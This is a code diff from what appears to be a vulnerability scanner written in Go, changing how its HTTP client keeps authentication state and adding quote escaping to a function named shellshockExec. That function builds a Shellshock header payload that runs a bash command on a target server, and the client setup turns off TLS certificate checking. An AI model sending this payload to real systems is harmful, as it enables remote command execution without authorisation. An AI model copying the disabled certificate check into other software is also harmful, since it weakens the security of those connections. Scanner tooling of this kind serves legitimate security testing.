@@ -112,13 +112,16 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 		return nil, nil
 	}
 
-	ac := authctx.HTTPClient(ctx)
-	client := &http.Client{
-		Timeout: 30 * time.Second,
-		Transport: &http.Transport{
+	client := authctx.HTTPClient(ctx)
+	// Ensure TLS verification is skipped and timeout is set,
+	// while preserving the auth client's transport (bearer tokens, cookies, etc.).
+	if client.Timeout == 0 {
+		client.Timeout = 30 * time.Second
+	}
+	if client.Transport == nil {
+		client.Transport = &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
-		},
-		Jar: ac.Jar,
+		}
 	}
 
 	scheme := detectScheme(ctx, client, asset)
@@ -225,7 +228,9 @@ func shellshockExec(ctx context.Context, client *http.Client, targetURL, header,
 	}
 
 	// Wrap command in /bin/bash -c for reliable execution.
-	shellPayload := fmt.Sprintf("() { :;}; echo; /bin/bash -c '%s'", cmd)
+	// Escape single quotes in cmd to prevent shell injection.
+	escaped := strings.ReplaceAll(cmd, "'", `'\''`)
+	shellPayload := fmt.Sprintf("() { :;}; echo; /bin/bash -c '%s'", escaped)
 	req.Header.Set(header, shellPayload)
 
 	resp, err := client.Do(req)
